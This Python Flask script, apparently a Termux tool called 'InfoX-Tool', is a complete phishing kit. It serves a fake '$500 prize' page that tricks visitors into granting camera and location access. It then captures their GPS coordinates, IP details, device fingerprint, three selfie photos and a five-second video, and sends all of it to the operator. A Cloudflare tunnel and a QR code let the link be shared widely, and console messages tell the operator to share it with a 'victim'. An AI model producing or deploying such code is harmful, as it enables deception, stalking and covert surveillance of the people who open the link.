from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import socket
import requests
import threading
from datetime import datetime
from typing import Optional

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify
    import qrcode
    from PIL import Image
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
except Exception as e:
    print("Missing packages. Install: pip install flask qrcode pillow colorama requests")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"

# Gallery paths
GALLERY_PATHS = [
    "/sdcard/DCIM/Camera",
    "/sdcard/DCIM/InfoX_Tool",
    "/sdcard/Pictures/InfoX_Tool",
    "/sdcard/Download/InfoX_Tool"
]

for path in GALLERY_PATHS:
    try:
        os.makedirs(path, exist_ok=True)
    except:
        pass

app = Flask(__name__)
public_url = None

def save_to_all_locations(file_data, filename, file_type="photo"):
    """Save file to all gallery locations"""
    saved_paths = []
    for gallery_path in GALLERY_PATHS:
        try:
            file_path = os.path.join(gallery_path, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)
            os.chmod(file_path, 0o644)
            saved_paths.append(file_path)
            print(f"{Fore.GREEN}✅ {file_type} saved to: {file_path}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ Failed to save to {gallery_path}: {e}{Style.RESET_ALL}")
            continue
    
    if saved_paths:
        # Force media scan
        try:
            for path in saved_paths:
                subprocess.run([
                    'am', 'broadcast', '-a', 'android.intent.action.MEDIA_SCANNER_SCAN_FILE',
                    '-d', f'file://{path}'
                ], capture_output=True, timeout=5)
        except:
            pass
    
    return saved_paths

def install_cloudflared():
    """Install cloudflared"""
    try:
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared is installed{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.YELLOW}📥 Installing cloudflared...{Style.RESET_ALL}")
    try:
        result = subprocess.run(['pkg', 'install', 'cloudflared', '-y'], 
                              capture_output=True, text=True, timeout=120)
        if result.returncode == 0:
            print(f"{Fore.GREEN}✅ cloudflared installed{Style.RESET_ALL}")
            return True
    except:
        pass
    
    print(f"{Fore.RED}❌ Failed to install cloudflared{Style.RESET_ALL}")
    return False

def start_cloudflare_tunnel():
    """Start Cloudflare tunnel"""
    global public_url
    
    print(f"{Fore.CYAN}🚀 Starting CLOUDFLARE tunnel...{Style.RESET_ALL}")
    
    subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
    time.sleep(2)
    
    try:
        process = subprocess.Popen([
            'cloudflared', 'tunnel',
            '--url', f'http://localhost:{PORT}'
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        print(f"{Fore.YELLOW}⏳ Waiting for Cloudflare tunnel (25 seconds)...{Style.RESET_ALL}")
        time.sleep(25)
        
        # Try to get URL
        for attempt in range(10):
            try:
                line = process.stderr.readline()
                if '.trycloudflare.com' in line:
                    import re
                    urls = re.findall(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                    if urls:
                        public_url = urls[0]
                        print(f"{Fore.GREEN}✅ CLOUDFLARE URL: {public_url}{Style.RESET_ALL}")
                        return public_url
            except:
                pass
            time.sleep(2)
        
        print(f"{Fore.YELLOW}⚠️ Cloudflare tunnel started but URL not captured{Style.RESET_ALL}")
        return "cloudflare_active"
        
    except Exception as e:
        print(f"{Fore.RED}❌ Cloudflare error: {e}{Style.RESET_ALL}")
        return None

def get_local_ip():
    """Get local IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def display_banner():
    """Display banner"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"\n{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.GREEN}{' InfoX-Tool '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{' by Sudip Sarkar '.center(60)}{Style.RESET_ALL}")
    print(f"{Back.RED}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

def display_qr_in_termux(url):
    """Display QR code"""
    try:
        qr = qrcode.QRCode(version=1, box_size=2, border=2)
        qr.add_data(url)
        qr.make(fit=True)
        
        qr_matrix = qr.get_matrix()
        qr_text = ""
        for row in qr_matrix:
            line = ""
            for cell in row:
                line += "██" if cell else "  "
            qr_text += line + "\n"
        
        print(f"\n{Fore.GREEN}📲 QR Code:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{qr_text}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 URL: {url}{Style.RESET_ALL}")
        
        img = qr.make_image(fill_color="black", back_color="white")
        img.save(QR_PNG)
        print(f"{Fore.GREEN}💾 QR saved: {QR_PNG}{Style.RESET_ALL}")
        return True
    except:
        return False

# MODERN HTML WITH ENHANCED UI
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎉 Claim Your $500 Prize!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: #fff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: rgba(0, 0, 0, 0.85);
            padding: 40px;
            border-radius: 15px;
            border: 2px solid #FFD700;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            animation: fadeIn 1s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .trophy {
            font-size: 100px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        .title {
            font-size: 36px;
            font-weight: bold;
            color: #FFD700;
            margin-bottom: 10px;
            text-shadow: 0 0 10px rgba(255, 215, 0, 0.7);
        }
        .reward {
            font-size: 48px;
            font-weight: bold;
            color: #FFD700;
            margin: 20px 0;
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);
        }
        .btn {
            background: linear-gradient(45deg, #FFD700, #FFA500);
            color: #1e3c72;
            border: none;
            padding: 15px 30px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
            background: linear-gradient(45deg, #FFA500, #FFD700);
        }
        .btn:disabled {
            background: #666;
            color: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-weight: bold;
            display: none;
            font-size: 16px;
        }
        .processing {
            background: #FFA500;
            display: block;
        }
        .success {
            background: #28a745;
            display: block;
        }
        .error {
            background: #dc3545;
            display: block;
        }
        .progress-container {
            margin: 20px 0;
            display: none;
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 5px;
            overflow: hidden;
        }
        .progress {
            height: 100%;
            background: #FFD700;
            width: 0;
            transition: width 0.5s ease;
        }
        .data {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
            text-align: left;
            display: none;
            border: 1px solid rgba(255, 255, 255, 0.3);
        }
        .data h3 {
            text-align: center;
            margin-bottom: 15px;
            color: #FFD700;
            font-size: 24px;
        }
        .data-item {
            margin: 10px 0;
            padding: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 5px;
            font-size: 14px;
        }
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        .feature {
            background: rgba(255, 255, 255, 0.1);
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            transition: transform 0.3s ease;
        }
        .feature:hover {
            transform: scale(1.05);
        }
        #cameraPreview {
            width: 100%;
            max-width: 400px;
            border: 2px solid #FFD700;
            border-radius: 10px;
            margin: 10px 0;
            display: none;
        }
        #capturedImages {
            display: flex;
            gap: 10px;
            margin: 10px 0;
            flex-wrap: wrap;
            justify-content: center;
        }
        .captured-image {
            width: 100px;
            height: 100px;
            border: 2px solid #FFD700;
            border-radius: 10px;
            object-fit: cover;
            transition: transform 0.3s ease;
        }
        .captured-image:hover {
            transform: scale(1.1);
        }
        .step {
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
            border-radius: 8px;
            margin: 5px 0;
            text-align: left;
            display: none;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="trophy">🎉</div>
        <div class="title">Congratulations!</div>
        <div>You've Won an Exclusive Prize</div>
        
        <div class="reward">$500</div>
        <div>Amazon Gift Card + Cash Reward</div>
        
        <div class="features">
            <div class="feature">💰 Instant Cash</div>
            <div class="feature">🎁 Gift Card</div>
            <div class="feature">📱 Digital Wallet</div>
            <div class="feature">⚡ Quick Transfer</div>
        </div>
        
        <div style="margin: 15px 0; font-size: 14px; opacity: 0.9;">
            ✅ Camera and location access required for verification
        </div>
        
        <button class="btn" id="claimBtn">
            🎁 Claim Your Prize Now
        </button>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
        </div>
        
        <!-- Steps -->
        <div class="step" id="step1">📱 Collecting device information...</div>
        <div class="step" id="step2">📍 Fetching location...</div>
        <div class="step" id="step3">🌐 Retrieving IP details...</div>
        <div class="step" id="step4">📸 Accessing camera...</div>
        <div class="step" id="step5">🖼️ Capturing photos...</div>
        <div class="step" id="step6">🎥 Recording video...</div>
        <div class="step" id="step7">📡 Sending data...</div>
        
        <video id="cameraPreview" autoplay muted playsinline></video>
        <div id="capturedImages"></div>
        
        <div id="status" class="status"></div>
        
        <div id="data" class="data">
            <h3>🎉 Prize Claimed Successfully!</h3>
            <div class="data-item">📍 Location: <span id="loc">Capturing...</span></div>
            <div class="data-item">🌐 IP Address: <span id="ip">Capturing...</span></div>
            <div class="data-item">📱 Device: <span id="device">Capturing...</span></div>
            <div class="data-item">🖥️ Screen: <span id="screen">Capturing...</span></div>
            <div class="data-item">🌍 Browser: <span id="browser">Capturing...</span></div>
            <div class="data-item">⏰ Timezone: <span id="timezone">Capturing...</span></div>
            <div class="data-item">📸 Photos: <span id="photos">0/3</span></div>
            <div class="data-item">🎥 Video: <span id="video">Not captured</span></div>
            <div style="text-align: center; margin-top: 15px; color: #FFD700; font-weight: bold;">
                ✅ Your $500 prize will be processed within 24 hours!
            </div>
        </div>
    </div>

    <script>
        // Global data object
        const collectedData = {
            deviceInfo: {},
            location: null,
            ipInfo: null,
            photos: [],
            video: null,
            timestamp: new Date().toISOString()
        };

        // Initialize on page load
        document.addEventListener('DOMContentLoaded', function() {
            collectedData.deviceInfo = getDeviceInfo();
            updateDisplay();
            document.getElementById('claimBtn').addEventListener('click', startVerification);
        });

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                screen: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                memory: navigator.deviceMemory || 'unknown',
                cores: navigator.hardwareConcurrency || 'unknown',
                touchPoints: navigator.maxTouchPoints || 'unknown'
            };
        }

        function updateDisplay() {
            document.getElementById('device').textContent = collectedData.deviceInfo.platform || 'Unknown';
            document.getElementById('screen').textContent = collectedData.deviceInfo.screen || 'Unknown';
            document.getElementById('browser').textContent = collectedData.deviceInfo.userAgent?.substring(0, 60) + '...' || 'Unknown';
            document.getElementById('timezone').textContent = collectedData.deviceInfo.timezone || 'Unknown';
            
            if (collectedData.location) {
                if (collectedData.location.latitude) {
                    document.getElementById('loc').textContent = 
                        `Lat: ${collectedData.location.latitude}, Lon: ${collectedData.location.longitude}`;
                } else {
                    document.getElementById('loc').textContent = 'Location access denied';
                }
            }
            
            if (collectedData.ipInfo) {
                document.getElementById('ip').textContent = collectedData.ipInfo.ip || 'Unknown';
            }
            
            document.getElementById('photos').textContent = `${collectedData.photos.length}/3 photos`;
            document.getElementById('video').textContent = collectedData.video ? '5-second video captured' : 'Not captured';
        }

        function showStep(stepNumber, progressPercent) {
            for (let i = 1; i <= 7; i++) {
                document.getElementById(`step${i}`).style.display = 'none';
            }
            document.getElementById(`step${stepNumber}`).style.display = 'block';
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('progress').style.width = `${progressPercent}%`;
        }

        async function startVerification() {
            const btn = document.getElementById('claimBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = '⏳ Processing Your Prize...';
            status.className = 'status processing';
            status.innerHTML = '🚀 Starting verification process...';
            status.style.display = 'block';

            try {
                showStep(1, 14);
                await sleep(1000);

                showStep(2, 28);
                collectedData.location = await getLocation();
                updateDisplay();
                await sleep(1000);

                showStep(3, 42);
                collectedData.ipInfo = await getIPInfo();
                updateDisplay();
                await sleep(1000);

                showStep(4, 56);
                await accessCameraAndCapture();

                showStep(7, 100);
                await sendAllData();

                status.className = 'status success';
                status.innerHTML = '✅ Prize claimed successfully! $500 is being processed.';
                document.getElementById('data').style.display = 'block';
                btn.style.display = 'none';

                console.log('🎯 ALL DATA CAPTURED:', collectedData);

            } catch (error) {
                status.className = 'status error';
                status.innerHTML = '❌ Error: ' + error.message;
                btn.disabled = false;
                btn.innerHTML = '🎁 Try Again';
                
                await sendAllData();
            }
        }

        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'Geolocation not supported' });
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        resolve({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed
                        });
                    },
                    (error) => {
                        resolve({ 
                            error: error.message,
                            code: error.code 
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );
            });
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    org: data.org,
                    timezone: data.timezone
                };
            } catch (error) {
                try {
                    const fallback = await fetch('https://api.ipify.org?format=json');
                    const data = await fallback.json();
                    return { ip: data.ip };
                } catch (e) {
                    return { error: 'Could not fetch IP information' };
                }
            }
        }

        async function accessCameraAndCapture() {
            const video = document.getElementById('cameraPreview');
            const capturedImages = document.getElementById('capturedImages');
            
            try {
                showStep(4, 56);
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                video.style.display = 'block';
                await video.play();
                
                await sleep(2000);
                
                showStep(5, 70);
                capturedImages.innerHTML = '';
                for (let i = 0; i < 3; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    collectedData.photos.push(imageData);
                    
                    const img = document.createElement('img');
                    img.src = imageData;
                    img.className = 'captured-image';
                    img.title = `Photo ${i + 1}`;
                    capturedImages.appendChild(img);
                    
                    updateDisplay();
                    await sleep(1500);
                }
                
                showStep(6, 85);
                if (MediaRecorder && MediaRecorder.isTypeSupported('video/webm')) {
                    const recorder = new MediaRecorder(stream, { 
                        mimeType: 'video/webm;codecs=vp9',
                        videoBitsPerSecond: 2500000
                    });
                    const chunks = [];
                    
                    recorder.ondataavailable = (event) => {
                        if (event.data.size > 0) {
                            chunks10
                            chunks.push(event.data);
                        }
                    };
                    
                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/webm' });
                        const reader = new FileReader();
                        reader.onload = () => {
                            collectedData.video = reader.result;
                            updateDisplay();
                        };
                        reader.readAsDataURL(blob);
                    };
                    
                    recorder.start();
                    await sleep(5000);
                    recorder.stop();
                } else {
                    console.warn('MediaRecorder not supported');
                }
                
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
                
            } catch (error) {
                throw new Error('Camera access denied or error: ' + error.message);
            }
        }

        async function sendAllData() {
            const payload = {
                ...collectedData,
                timestamp: new Date().toISOString(),
                mediaType: 'real_camera_capture'
            };
            
            try {
                const response = await fetch('/report', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok) {
                    throw new Error('Server response not OK');
                }
                
                const result = await response.json();
                console.log('✅ Data sent successfully:', result);
                
            } catch (error) {
                console.error('❌ Failed to send data:', error);
                await sendFallbackData();
            }
        }

        async function sendFallbackData() {
            const dataStr = encodeURIComponent(JSON.stringify(collectedData));
            const img = new Image();
            img.src = `/fallback?data=${dataStr}`;
        }

        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        updateDisplay();
    </script>
</body>
</html>
'''

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    print(f"\n{Fore.GREEN}{'🎯 NEW VICTIM ACCESSED ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 IP: {client_ip}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📱 User Agent: {user_agent}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}⏰ Time: {datetime.now()}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
    
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json()
        print(f"\n{Fore.GREEN}{'🚨 DATA CAPTURE STARTED ':=^60}{Style.RESET_ALL}")
        
        device_info = data.get("deviceInfo", {})
        location = data.get("location", {})
        ip_info = data.get("ipInfo", {})
        photos = data.get("photos", [])
        video = data.get("video")
        timestamp = data.get("timestamp")
        
        print(f"{Fore.YELLOW}📱 DEVICE INFORMATION:{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Platform: {device_info.get('platform', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Screen: {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Browser: {device_info.get('userAgent', 'Unknown')[:80]}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}📍 LOCATION:{Style.RESET_ALL}")
        if location.get('latitude'):
            print(f"{Fore.GREEN}  ✅ Latitude: {location.get('latitude')}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}  ✅ Longitude: {location.get('longitude')}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}  ✅ Accuracy: {location.get('accuracy')} meters{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}  ❌ Location access denied: {location.get('error', 'Unknown error')}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}🌐 IP INFORMATION:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ IP: {ip_info.get('ip', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  City: {ip_info.get('city', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  Country: {ip_info.get('country', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  ISP: {ip_info.get('org', 'Unknown')}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}📸 MEDIA CAPTURED:{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ Photos: {len(photos)}/3 real images{Style.RESET_ALL}")
        print(f"{Fore.GREEN}  ✅ Video: {'5-second recording' if video else 'Not captured'}{Style.RESET_ALL}")
        
        photo_files = []
        for i, photo_data in enumerate(photos):
            try:
                if photo_data.startswith('data:image'):
                    photo_data = photo_data.split(',')[1]
                img_data = base64.b64decode(photo_data)
                timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"InfoX_Photo_{timestamp_str}_{i+1}.jpg"
                
                saved_paths = save_to_all_locations(img_data, filename, "REAL PHOTO")
                if saved_paths:
                    photo_files.append(filename)
                    print(f"{Fore.GREEN}  ✅ Photo {i+1} saved to gallery{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}  ❌ Photo {i+1} save failed: {e}{Style.RESET_ALL}")
        
        video_file = None
        if video:
            try:
                if video.startswith('data:video'):
                    video = video.split(',')[1]
                video_data = base64.b64decode(video)
                timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"InfoX_Video_{timestamp_str}.webm"
                
                saved_paths = save_to_all_locations(video_data, filename, "REAL VIDEO")
                if saved_paths:
                    video_file = filename
                    print(f"{Fore.GREEN}  ✅ Video saved to gallery{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}  ❌ Video save failed: {e}{Style.RESET_ALL}")
        
        record = {
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': ip_info.get('ip', 'Unknown'),
            'city': ip_info.get('city', 'Unknown'),
            'country': ip_info.get('country', 'Unknown'),
            'isp': ip_info.get('org', 'Unknown'),
            'latitude': location.get('latitude', 'Unknown'),
            'longitude': location.get('longitude', 'Unknown'),
            'accuracy': location.get('accuracy', 'Unknown'),
            'photos': len(photos),
            'video': 'Yes' if video else 'No',
            'user_agent': device_info.get('userAgent', 'Unknown'),
            'platform': device_info.get('platform', 'Unknown'),
            'screen': device_info.get('screen', 'Unknown'),
            'timezone': device_info.get('timezone', 'Unknown')
        }
        
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=record.keys())
            if not file_exists:
                writer.writeheader()
            writer.writerow(record)
        
        print(f"{Fore.GREEN}  ✅ Report saved to: {REPORT_CSV}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}{'🎯 DATA CAPTURE COMPLETED ':=^60}{Style.RESET_ALL}")
        
        return jsonify({"status": "success", "message": "Data captured successfully"})
        
    except Exception as e:
        print(f"{Fore.RED}{'❌ DATA CAPTURE ERROR ':=^60}{Style.RESET_ALL}")
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/fallback")
def fallback_data():
    """Fallback endpoint for data collection"""
    data_str = request.args.get('data')
    if data_str:
        try:
            data = json.loads(data_str)
            print(f"{Fore.YELLOW}📝 Fallback data received{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Data: {json.dumps(data, indent=2)}{Style.RESET_ALL}")
        except:
            pass
    return jsonify({"status": "logged"})

def main():
    global public_url
    
    display_banner()
    
    print(f"\n{Back.GREEN}{Fore.WHITE}{'🚀 WAN TUNNEL SETUP ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔄 Setting up Cloudflare tunnel for WAN access...{Style.RESET_ALL}")
    
    if install_cloudflared():
        final_url = start_cloudflare_tunnel()
        service_name = "CLOUDFLARE"
    else:
        local_ip = get_local_ip()
        final_url = f"http://{local_ip}:{PORT}"
        service_name = "LOCAL"
    
    if not final_url or final_url == "cloudflare_active":
        local_ip = get_local_ip()
        final_url = f"http://{local_ip}:{PORT}"
        service_name = "LOCAL"
        print(f"{Fore.RED}❌ Using local URL (only same WiFi){Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}{' SERVER READY ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🌐 Final URL: {final_url}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}🔧 Service: {service_name}{Style.RESET_ALL}")
    
    if service_name != "LOCAL":
        print(f"{Fore.GREEN}✅ This works on ANY device and ANY network!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Only works on same WiFi network{Style.RESET_ALL}")
    
    display_qr_in_termux(final_url)
    
    print(f"\n{Fore.YELLOW}🚀 Share this URL with victim{Style.RESET_ALL}")
    print(f"{Fore.GREEN}📸 Will capture: 3 photos + 5s video + Location + IP + Device info{Style.RESET_ALL}")
    print(f"{Fore.RED}🔴 Waiting for victim...{Style.RESET_ALL}")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}🛑 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
